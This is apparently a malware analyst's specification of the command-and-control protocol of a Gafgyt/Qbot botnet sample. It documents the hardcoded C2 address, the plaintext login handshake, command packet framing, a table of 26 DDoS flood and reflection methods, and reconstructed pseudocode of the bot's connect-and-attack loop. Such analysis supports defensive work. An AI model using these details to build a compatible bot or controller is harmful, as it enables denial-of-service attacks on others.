# Gafgyt/Qbot Botnet — Communication Layer Technical Specification

## Binary Identification
- **Sample Name**: `deepsorrow`
- **Architecture**: x86 32-bit ELF
- **C2 Address**: `62.60.159.184:18129`
- **Banner**: `"im in deep sorrow.\n"`
- **Process Name**: `"/var/Sofia"` (set via `prctl(PR_SET_NAME, ...)`)

---

## 1. Session Establishment

### 1.1 Observed Behavior

The session establishment follows a fixed sequence that occurs once, immediately after the C2 socket connects. The sequence is:

1. **TCP connect** to C2 at `62.60.159.184:18129`
2. **Send login handshake** (5 segments, described below)
3. **Enter select-based receive loop** — the bot does NOT wait for a specific server response before considering the session established. Instead, it immediately enters the command processing loop. The server is expected to send framed packets at any time.

There is **no challenge-response**, **no server authentication**, **no session token exchange**, and **no key agreement**. The handshake is a one-way transmission of identity credentials, after which the bot considers itself authenticated and begins processing incoming commands.

### 1.2 Handshake Logic (Pseudocode)

```
function send_login_handshake(fd, password):
    // Segment 1: 4-byte magic/version header
    uint8_t magic[4] = { 0x00, 0x00, 0x00, 0x01 }
    send(fd, magic, 4, MSG_NOSIGNAL)

    // Segment 2: 1-byte password length
    uint8_t pw_len = min(strlen(password), 31)
    send(fd, &pw_len, 1, MSG_NOSIGNAL)

    // Segment 3: password bytes (if length > 0)
    if pw_len > 0:
        send(fd, password, pw_len, MSG_NOSIGNAL)

    // Segment 4: 1-byte architecture type identifier
    uint8_t arch_type = 0x03
    send(fd, &arch_type, 1, MSG_NOSIGNAL)

    // Segment 5: architecture string (3 bytes)
    uint8_t arch_str[3] = { 0x78, 0x38, 0x36 }  // "x86"
    send(fd, arch_str, 3, MSG_NOSIGNAL)
```

**Wire format of the complete login payload (concatenated):**

```
Offset  Size  Field          Value         Description
------  ----  -------------  ------------  --------------------------------
0       4     Magic          0x00000001    Protocol version / magic number
4       1     PasswordLen    N             Length of password (0-31)
5       N     Password       argv[1]       C2 password from command line
5+N     1     ArchType       0x03          Architecture type identifier
6+N     3     ArchString     "x86"         Architecture name string
```

**Total login payload size**: 9 + N bytes, where N = password length (0-31).

### 1.3 Credentials

- **Password**: The bot accepts a password as its first command-line argument (`argv[1]`). The password is copied into a 32-byte local buffer. If the password length is >= 32 bytes, it is silently ignored (not copied). The password is sent as plaintext in the login handshake.
- **Architecture string**: Hardcoded as `"x86"` (3 bytes, no null terminator sent).
- **Architecture type byte**: Hardcoded as `0x03`.

### 1.4 Fingerprinting Behavior

During the handshake, the bot transmits:
- A 4-byte magic/version identifier (`0x00000001`)
- The plaintext password
- The architecture type (`0x03`) and architecture string (`"x86"`)

No victim fingerprinting (IP, hostname, system info, running processes, etc.) is collected or transmitted during the handshake. The bot does **not** send any system information beyond the architecture identifier.

### 1.5 Server Response / Session Acceptance

**Verified Fact**: The bot does NOT validate any server response before considering the session established. After sending the login handshake, it immediately enters the main `select()` loop and begins processing incoming packets.

**Session acceptance criteria**: There is no explicit acceptance. The bot simply:
1. Sets a flag (`DAT_08068abc = 0`) indicating the login has been sent
2. Resets the heartbeat counter (`DAT_08068ac8 = 0`)
3. Resets the reconnect backoff timer (`DAT_080642b4 = 1`)
4. Enters the main command loop

**Failure handling**: If the server closes the connection or if any `recv()` returns 0, the bot calls `c2_reconnect()` which:
1. Closes the current socket (if valid)
2. Sets the socket FD to `-1`
3. Sleeps for `DAT_080642b4` seconds (exponential backoff: 1, 2, 4, 8, ..., max 60)
4. Doubles the backoff timer (`DAT_080642b4 *= 2`, capped at 60)
5. Increments the reconnection counter (`DAT_08068ac8++`)
6. On the next loop iteration, creates a new socket and reconnects

**Analysis Gap**: The server-side protocol is unknown. The bot sends its login and expects the server to begin sending framed commands. No specific "login accepted" or "login rejected" packet format is defined in the bot — the bot processes any valid packet it receives.

---

## 2. Cryptography

### 2.1 Observed Behavior

**Verified Fact**: There is **no encryption** applied to C2 network traffic. All communication — login handshake, commands, and any responses — is transmitted in **plaintext** over the TCP stream.

The only obfuscation mechanism present in the binary is the **string table XOR obfuscation** (`table_lock_val` / `table_unlock_val`), which is used exclusively to hide static strings within the binary (e.g., file paths, shell commands, process names). This obfuscation is **not** applied to network traffic.

### 2.2 String Table Obfuscation (Internal Only)

For completeness, the string obfuscation used internally:

| Property | Value |
|----------|-------|
| **Algorithm** | XOR with static 32-bit key |
| **Key** | `0xDEADBEEF` |
| **Effective XOR byte** | `0x22` (0xEF ^ 0xBE ^ 0xAD ^ 0xDE) |
| **Operation** | Each byte is XORed with all four key bytes sequentially (equivalent to XOR with 0x22) |

**Decryption routine:**
```
function table_xor_decode(entry_index):
    key = 0xDEADBEEF
    ptr = table[entry_index].pointer
    len = table[entry_index].length
    for i = 0 to len-1:
        ptr[i] = ptr[i] ^ (key & 0xFF)         // XOR with 0xEF
        ptr[i] = ptr[i] ^ ((key >> 8) & 0xFF)   // XOR with 0xBE
        ptr[i] = ptr[i] ^ ((key >> 16) & 0xFF)  // XOR with 0xAD
        ptr[i] = ptr[i] ^ ((key >> 24) & 0xFF)  // XOR with 0xDE
```

**Decoded table entries** (indices found in `table_init`):

| Index | Decoded String |
|-------|----------------|
| 3 | `"TSource Engine Query"` |
| 9 | `"enable"` |
| 10 | `"system"` |
| 11 | `"shell"` |
| 12 | `"sh"` |
| 13 | `"/bin/busybox MIRAI"` |
| 14 | `"ncorrect"` |
| 15 | `"MIRAI: applet not found"` |

**Note**: Table index 1 (used to retrieve the banner in the reference guide) is NOT initialized by `table_init` in this sample. The banner is hardcoded as the string `"im in deep sorrow.\n"`.

### 2.3 Network Cryptography Summary

| Property | Value |
|----------|-------|
| **Encryption** | None |
| **Encoding** | None |
| **Obfuscation** | None |
| **Message Integrity** | None (no checksums, no HMAC, no signatures) |
| **Key Exchange** | Not applicable |

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The main command processing loop is driven by `select()` with a 30-second timeout. The loop handles:

1. **New connections** on the single-instance control socket (port 18129 on localhost) — triggers `stop_attacks_and_kill_all()` followed by `kill(-session_id, 9)` and `exit(0)`
2. **Incoming C2 data** on the server socket — reads framed packets, validates, and executes commands
3. **Heartbeat pings** — on select timeout (no data for 30 seconds), sends a 2-byte ping

The loop runs indefinitely until the process is killed.

### 3.2 Protocol Specification

#### 3.2.1 Wire Framing

All C2-to-bot messages use a **length-prefixed framing**:

```
[2-byte big-endian length][N-byte payload]
```

- **Length field**: 2 bytes, big-endian (network byte order), indicating the size of the payload that follows
- **Payload**: N bytes, where N = value of the length field
- **Maximum payload size**: 8192 bytes (0x2000). If the length exceeds this, the bot closes the connection and reconnects.

#### 3.2.2 Packet Reception (Pseudocode)

```
function read_packet(fd):
    // Step 1: Peek at 2-byte length
    uint8_t len_buf[2]
    result = recv(fd, len_buf, 2, MSG_PEEK | MSG_NOSIGNAL)
    if result == -1:
        if errno == EAGAIN || errno == EINTR:
            return NO_DATA
        else:
            return ERROR
    if result == 0:
        return CONNECTION_CLOSED

    // Step 2: Byteswap to get payload length
    payload_len = (len_buf[0] << 8) | len_buf[1]
    if payload_len == 0:
        // Zero-length indicator — consume and restart
        recv(fd, len_buf, 2, MSG_NOSIGNAL)
        return NO_DATA
    if payload_len > 8192:
        close(fd)
        return ERROR

    // Step 3: Peek at the payload
    uint8_t payload[payload_len]
    result = recv(fd, payload, payload_len, MSG_PEEK | MSG_NOSIGNAL)
    if result <= 0:
        return ERROR

    // Step 4: Consume the framing (length + payload)
    recv(fd, len_buf, 2, MSG_NOSIGNAL)         // consume length
    recv(fd, payload, payload_len, MSG_NOSIGNAL) // consume payload

    return payload, payload_len
```

#### 3.2.3 Payload Format

Each decoded payload has the following structure:

```
Offset  Size  Field           Description
------  ----  --------------  -------------------------------------------------
0       4     Duration        Attack duration in seconds (big-endian uint32).
                              Value 0 = control command (see below).
4       1     MethodID        Attack method ID or command opcode.
5       1     NumTargets      Number of target entries (0-255).
6       N     Targets         Target entries, each 5 bytes (see below).
6+N     1     NumOptions      Number of option entries (0-255).
7+N     M     Options         Option entries (variable length, see below).
```

**Special values for Duration == 0:**

| MethodID | Command | Behavior |
|----------|---------|----------|
| `0xFF` (-1) | Toggle Scanner | Toggles `DAT_08068ac0` (scanner enable flag) between 0 and 1 |
| `0xFE` (-2) | Stop Attacks | Calls `stop_attacks_and_kill_all()` which kills all attack child processes and all processes in the same process group |

#### 3.2.4 Target Entry Format (5 bytes each)

```
Offset  Size  Field   Description
------  ----  ------  -----------------------------------------------
0       4     IP      Target IP address (network byte order, uint32)
4       1     CIDR    CIDR prefix length (subnet mask bits)
```

The bot stores each target internally as a 24-byte structure:
```
struct target {
    uint16_t family;    // Always 2 (AF_INET)
    uint32_t ip;        // IP address (at offset 4)
    uint32_t ip_copy;   // Redundant copy of IP (at offset 0x10)
    uint8_t  cidr;      // CIDR prefix length (at offset 0x14)
    uint8_t  padding[5]; // Alignment padding
};
```

#### 3.2.5 Option Entry Format (variable length)

```
Offset  Size  Field       Description
------  ----  ----------  -----------------------------------------------
0       1     OptionID    Option identifier byte (see table below)
1       1     ValueLen    Length of the option value string
2       N     Value       Option value string (NOT null-terminated on wire)
```

**Option IDs and their meaning:**

| OptionID | Name | Type | Description |
|----------|------|------|-------------|
| `0x00` | (reserved) | — | — |
| `0x01` | Port(s) | `uint16[]` | Comma-separated list of port numbers |
| `0x02` | Duration | `uint32` | Attack duration in seconds (overrides packet-level duration) |
| `0x03` | (varies) | `uint8` | Generic byte parameter |
| `0x04` | (varies) | `uint32` | Generic 32-bit integer parameter |
| `0x05` | (varies) | `uint32` | Generic IP address parameter |

The option value is always stored as an ASCII string and parsed by the attack handler using:
- `attack_option_get_byte()` — converts string to integer via `util_strtol()`
- `attack_option_get_ip()` — converts string to IP address
- `attack_option_get_ports()` — parses comma-separated port list

**Default values** (used if option is not present):
- Port: `0xFFFF` (random port)
- Byte: `0`
- IP: `0` (INADDR_ANY)

### 3.3 Opcode Interpretation — Attack Method IDs

The `attack_init()` function registers 26 attack methods (IDs `0x00` through `0x1A`). The method ID in the packet selects the attack handler via a dynamic dispatch table.

#### Attack Method Dispatch Table

| ID | Function Address | Attack Name | Description |
|----|-----------------|-------------|-------------|
| `0x00` | `0x0804b5f4` | `attack_method_raw` | Raw IP socket flood (`IPPROTO_RAW`) |
| `0x01` | `0x0804b934` | `attack_udp_custom` | Custom UDP flood with specialized buffers |
| `0x02` | `0x0804d42b` | `attack_method_std` | Standard UDP flood (loops UDP sockets, random source ports) |
| `0x03` | `0x0804a124` | `attack_tcp_ack` | TCP ACK flood (raw packets with ACK flag) |
| `0x04` | `0x08049b93` | `attack_tcp_syn` | TCP SYN flood (raw packets with SYN flag) |
| `0x05` | `0x080494da` | `attack_tcp_stomp` | TCP Stomp (custom TCP after connection establishment) |
| `0x06` | `0x0804c0c2` | `attack_method_ovh` | OVH bypass flood |
| `0x07` | `0x0804bc5a` | `attack_tcp_bypass` | TCP bypass flood (formulated headers to evade mitigation) |
| `0x08` | `0x0804aedd` | `attack_method_nudp` | NUDP flood (non-conforming UDP packets) |
| `0x09` | `0x0804b3e1` | `attack_method_udphex` | UDP hex flood (hex payloads via UDP) |
| `0x0A` | `0x0804aba9` | `attack_udp_plain` | Plain UDP flood (raw high-speed UDP) |
| `0x0B` | `0x0804b1f9` | `attack_method_stdhex` | Standard hex flood (UDP + hex payloads) |
| `0x0C` | `0x0804c49b` | `attack_method_nfo` | NFO bypass flood |
| `0x0D` | `0x0804a6e8` | `attack_method_tcp` | TCP generic flood (TCP options from C2) |
| `0x0E` | `0x0804aedd` | `attack_method_nudp` | NUDP flood (duplicate registration) |
| `0x0F` | `0x0804ca28` | `FUN_0804ca28` | Unidentified attack method |
| `0x10` | `0x0804e100` | `FUN_0804e100` | Unidentified attack method |
| `0x11` | `0x0804dc4c` | `FUN_0804dc4c` | Unidentified attack method |
| `0x12` | `0x0804d697` | `FUN_0804d697` | Unidentified attack method |
| `0x13` | `0x0804d42b` | `attack_method_std` | Standard UDP flood (duplicate of ID 0x02) |
| `0x14` | `0x0804f2f7` | `attack_application_layer` | Application-layer flood dispatcher |
| `0x15` | `0x0805016c` | `attack_method_ovhdrop` | OVH drop flood |
| `0x16` | `0x08050be0` | `util_build_ldap_packet` | LDAP reflection/amplification |
| `0x17` | `0x080506e1` | `util_build_memcache_packet` | Memcached reflection/amplification |
| `0x18` | `0x08051226` | `util_build_ntp_monlist` | NTP monlist reflection/amplification |
| `0x19` | `0x08051ae8` | `util_build_tftp_packet` | TFTP reflection/amplification |
| `0x1A` | `0x08052138` | `util_build_ard_packet` | ARD reflection/amplification |

**Note**: IDs `0x0F` through `0x12` are unnamed functions whose exact attack technique could not be determined from static analysis alone. They are registered as attack methods with their own handler functions.

### 3.4 Attack Execution Flow

The `attack_start()` function handles attack execution with a **double-fork** pattern:

```
function attack_start(duration, method_id, num_targets, targets, num_options, options):
    if duration <= 0:
        return

    reap_zombie_children()  // Clean up finished attack processes

    supervisor_pid = fork()
    if supervisor_pid > 0:
        // Parent (main daemon): record PID in attack tracking table
        for i = 0 to 7:
            if attack_pids[i] == 0:
                attack_pids[i] = supervisor_pid
                break
        return  // Return to C2 select loop

    if supervisor_pid == 0:
        // Child: Attack Supervisor Process
        timer_pid = fork()
        if timer_pid == 0:
            // Grandchild: Timer Process
            sleep(duration)
            kill(getppid(), SIGKILL)  // Kill supervisor after duration
            exit(0)

        // Supervisor: Find method handler and execute
        for i = 0 to num_registered_methods:
            if method_table[i].id == method_id:
                method_table[i].handler(duration, targets, options)
                // Handler enters infinite flood loop
                break

        exit(0)  // Should not reach here normally
```

### 3.5 Dynamic Registration

**Verified Fact**: Attack methods are registered statically at startup in `attack_init()`. There is **no runtime dynamic registration mechanism** for new commands or attack methods. The dispatch table is built once during initialization and never modified.

### 3.6 Packet Validation

```
function c2_packet_validate(payload, length):
    if length <= 4:
        return INVALID

    // Byteswap the first 4 bytes to get duration
    duration = byteswap32(*(uint32*)payload)

    if duration == 0:
        method_id = *(int8*)(payload + 4)
        // Check if method_id is 0xFE or 0xFF
        if (uint8)(method_id + 3) < 2:
            return IS_STOP_COMMAND  // Returns true (stop command detected)

    return VALID
```

When `c2_packet_validate()` returns `true` (indicating a stop command), the bot calls `stop_attacks_and_kill_all()` and skips `c2_packet_parse_and_execute()`.

### 3.7 Message Processing Logic (Pseudocode)

```
function main_command_loop():
    // Initialize
    table_init()
    single_instance_bind()
    util_rand_init()

    // Extract password from argv[1]
    if argc == 2:
        pw_len = strlen(argv[1])
        if pw_len < 32:
            strcpy(password_buf, argv[1])
            memset(argv[1], 0, pw_len)

    // Set process name
    strcpy(argv[0], "/var/Sofia")
    prctl(PR_SET_NAME, "/var/Sofia")

    // Write banner
    write(1, "im in deep sorrow.", 18)
    write(1, "\n", 1)

    // Daemonize
    pid = fork()
    if pid > 0:
        exit(0)
    setsid()
    close(0); close(1); close(2)

    // Initialize subsystems
    attack_init()
    killer_init()
    scanner_init()

    // Main select loop
    reconnect_backoff = 1
    heartbeat_counter = 0

    while true:
        FD_ZERO(&read_set)
        FD_ZERO(&write_set)

        if ctrl_fd != -1:
            FD_SET(ctrl_fd, &read_set)

        if serv_fd == -1:
            // Create and connect C2 socket
            serv_fd = socket(AF_INET, SOCK_STREAM, 0)
            if serv_fd != -1:
                // Set socket options
                setsockopt(serv_fd, SOL_SOCKET, SO_KEEPALIVE, &1, 4)
                setsockopt(serv_fd, IPPROTO_TCP, TCP_KEEPIDLE, &30, 4)
                setsockopt(serv_fd, IPPROTO_TCP, TCP_KEEPINTVL, &10, 4)
                setsockopt(serv_fd, IPPROTO_TCP, TCP_KEEPCNT, &3, 4)
                // Set non-blocking
                flags = fcntl(serv_fd, F_GETFL, 0)
                fcntl(serv_fd, F_SETFL, flags | O_NONBLOCK)
                // Connect
                connect(serv_fd, &c2_addr, 16)
                // serv_fd goes into write_set for connection completion
                FD_SET(serv_fd, &write_set)
                login_sent = false
        else:
            FD_SET(serv_fd, &read_set)

        // Calculate max_fd
        max_fd = max(ctrl_fd, serv_fd) + 1

        // Select with 30-second timeout
        struct timeval tv = { .tv_sec = 30, .tv_usec = 0 }
        result = select(max_fd, &read_set, &write_set, NULL, &tv)

        if result == -1:
            if errno == EINTR:
                continue
            sleep(1)
            continue

        if result == 0:
            // Timeout — send heartbeat
            uint16_t ping = 0x0000  // 2 zero bytes
            send(serv_fd, &ping, 2, MSG_NOSIGNAL)
            heartbeat_counter++
            if heartbeat_counter > 119:  // 0x77
                c2_reconnect()
            continue

        // Reset heartbeat counter on any activity
        heartbeat_counter = 0

        // Handle scanner toggle (if flag set by C2 command)
        if scanner_enabled:
            scanner_main_loop()

        // Handle control socket (single-instance)
        if ctrl_fd in read_set:
            accept(ctrl_fd, ...)
            stop_attacks_and_kill_all()
            kill(-getpid(), SIGKILL)
            exit(0)

        // Handle C2 socket
        if login_sent == false AND serv_fd in write_set:
            // Connection completed — send login
            login_sent = true

            // Check socket error
            int error = 0
            getsockopt(serv_fd, SOL_SOCKET, SO_ERROR, &error, &optlen)
            if error != 0:
                close(serv_fd)
                serv_fd = -1
                sleep(util_rand_next() % 10 + 1)
                continue

            // Send login handshake
            uint8_t magic[4] = { 0x00, 0x00, 0x00, 0x01 }
            send(serv_fd, magic, 4, MSG_NOSIGNAL)

            uint8_t pw_len = strlen(password_buf)
            send(serv_fd, &pw_len, 1, MSG_NOSIGNAL)
            if pw_len > 0:
                send(serv_fd, password_buf, pw_len, MSG_NOSIGNAL)

            uint8_t arch_type = 0x03
            send(serv_fd, &arch_type, 1, MSG_NOSIGNAL)
            send(serv_fd, "x86", 3, MSG_NOSIGNAL)

            // Mark login as sent
            login_sent = false  // Set DAT_08068abc = 0
            heartbeat_counter = 0
            reconnect_backoff = 1

        if serv_fd in read_set:
            // Read framed packet
            payload, len = read_packet(serv_fd)
            if len == NO_DATA or len == ERROR:
                continue
            if len == CONNECTION_CLOSED:
                c2_reconnect()
                continue

            if len == 0:
                continue

            // Validate packet
            heartbeat_counter = 0
            if c2_packet_validate(payload, len):
                stop_attacks_and_kill_all()
                continue

            // Parse and execute
            c2_packet_parse_and_execute(payload, len)
```

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The bot maintains its C2 session through two mechanisms:

1. **Heartbeat pings**: Sent when `select()` times out (no data received for 30 seconds)
2. **No explicit ACKs**: The bot does NOT send acknowledgment messages for received commands

### 4.2 Heartbeat / Keepalive

**Verified Fact**: The heartbeat is a 2-byte payload of all zeros:

```
Offset  Size  Value  Description
------  ----  -----  ----------------------------
0       2     0x0000 Heartbeat/ping sentinel
```

**Transmission logic:**
```
select_timeout_seconds = 30  // Confirmed from disassembly: MOV [ESP+0x21bc], 0x1e

On every select() timeout (no data for 30 seconds):
    send(serv_fd, uint16(0x0000), 2, MSG_NOSIGNAL)
    heartbeat_counter++
    if heartbeat_counter > 119:  // 0x77 = 119
        // More than 119 consecutive timeouts = ~59.5 minutes idle
        c2_reconnect()
```

**Reconnection logic:**
```
function c2_reconnect():
    if serv_fd != -1:
        close(serv_fd)
    serv_fd = -1
    sleep(reconnect_backoff)        // Wait with exponential backoff
    reconnect_backoff *= 2
    if reconnect_backoff > 60:
        reconnect_backoff = 60
    reconnection_count++
```

**Reconnection triggers:**
- `recv()` returns 0 (connection closed by server)
- `recv()` returns -1 with errno != EAGAIN and errno != EINTR
- Heartbeat counter exceeds 119 consecutive timeouts
- Received payload length exceeds 8192 bytes

### 4.3 Command Responses / ACKs

**Verified Fact**: The bot does **not** send any acknowledgment, execution status, or result message back to the C2 after processing a command. There is:

- No ACK for received commands
- No execution success/failure notification
- No attack completion notification
- No error reporting
- No telemetry or status updates
- No victim information transmission

The only data the bot transmits to the C2 is:
1. The **login handshake** (once per connection)
2. **Heartbeat pings** (2 zero bytes every 30 seconds of inactivity)

### 4.4 Status Reporting

**Verified Fact**: There is no periodic or event-driven status reporting mechanism. The bot operates in a "fire-and-forget" mode — it receives commands, executes them silently, and never reports results.

### 4.5 Session Lifecycle

**Session establishment**:
1. TCP connect to C2
2. Send login handshake
3. Enter command loop immediately

**Session maintenance**:
- `select()` loop with 30-second timeout
- Heartbeat ping every 30 seconds of inactivity
- No sequence numbers, message IDs, or state tracking

**Session termination**:
- Server closes connection → bot reconnects with exponential backoff
- Heartbeat timeout (>119 consecutive timeouts) → bot reconnects
- Packet too large (>8192 bytes) → bot closes and reconnects
- Control socket connection (another instance detected) → `kill(-session_id, 9)` → process group terminated

**Session recovery**:
- On disconnect, the bot uses exponential backoff: 1s, 2s, 4s, 8s, ..., max 60s
- The bot reconnects from scratch — sends a new login handshake on each connection
- No session state is preserved across reconnections

### 4.6 Feedback Logic (Pseudocode)

```
function send_heartbeat(fd):
    uint8_t ping[2] = { 0x00, 0x00 }
    send(fd, ping, 2, MSG_NOSIGNAL)

function c2_reconnect():
    if serv_fd != -1:
        close(serv_fd)
    serv_fd = -1
    sleep(reconnect_backoff)
    reconnect_backoff = min(reconnect_backoff * 2, 60)
    reconnection_count++

// In main loop — no ACK generation for commands
// No status reporting — ever
// No attack result transmission
```

---

## 5. Analysis Gaps

| Gap | Description | Impact |
|-----|-------------|--------|
| **Server-side protocol** | The C2 server implementation is not available. The bot's protocol is fully documented, but the server's expected behavior (particularly around login validation and session management) is inferred from the bot's receive logic. | Low — the bot does not validate server responses |
| **Option semantics** | Options IDs 0x03, 0x04, and 0x05 are parsed generically. Their exact meaning depends on the attack handler that receives them. The handler-specific interpretation was not analyzed. | Medium — affects attack parameter understanding |
| **Attack handlers IDs 0x0F-0x12** | Four unnamed attack handler functions could not be identified by technique name. Their addresses are known (`0x0804ca28`, `0x0804dc4c`, `0x0804d697`, `0x0804e100`). | Low — the dispatch mechanism is fully documented |
| **Application-layer dispatcher (ID 0x14)** | `attack_application_layer` dispatches to sub-handlers for amplification attacks. The exact sub-dispatch logic was not analyzed in detail. | Medium — affects amplification attack understanding |
| **Table index 0-2, 4-8** | The `table_init` function only initializes 8 specific indices (3, 9, 10, 11, 12, 13, 14, 15). The remaining table slots are uninitialized or initialized elsewhere. | Low — not relevant to C2 communication |

---

## 6. Protocol Constants Summary

| Constant | Value | Description |
|----------|-------|-------------|
| C2 IP address | `62.60.159.184` | Hardcoded C2 server address |
| C2 TCP port | `18129` (0x46D1) | Hardcoded C2 server port |
| Single-instance port | `18129` (0x46D1) | Local bind port for single-instance enforcement |
| Login magic | `0x00000001` | 4-byte login header |
| Architecture type | `0x03` | Architecture type identifier byte |
| Architecture string | `"x86"` | 3-byte architecture identifier |
| Banner string | `"im in deep sorrow.\n"` | Startup banner written to stdout |
| Process name | `"/var/Sofia"` | Name set via prctl and argv[0] rewrite |
| XOR key (internal) | `0xDEADBEEF` | Key for string table obfuscation |
| Effective XOR byte | `0x22` | Combined XOR value (0xEF ^ 0xBE ^ 0xAD ^ 0xDE) |
| Max password length | 31 bytes | Maximum password accepted from argv[1] |
| Max payload size | 8192 bytes (0x2000) | Maximum C2 command payload |
| Heartbeat payload | `0x0000` (2 bytes) | Heartbeat/ping sentinel |
| Select timeout | 30 seconds | Interval triggering heartbeat |
| Max heartbeats | 119 | Consecutive timeouts before reconnect |
| Reconnect backoff min | 1 second | Initial reconnect delay |
| Reconnect backoff max | 60 seconds | Maximum reconnect delay |
| Attack tracking slots | 8 | Maximum concurrent tracked attack PIDs |
| Target struct size | 24 bytes (0x18) | Internal target entry size |
| Option struct size | 8 bytes | Internal option entry size |
| Total attack methods | 26 | Registered method IDs (0x00-0x1A) |
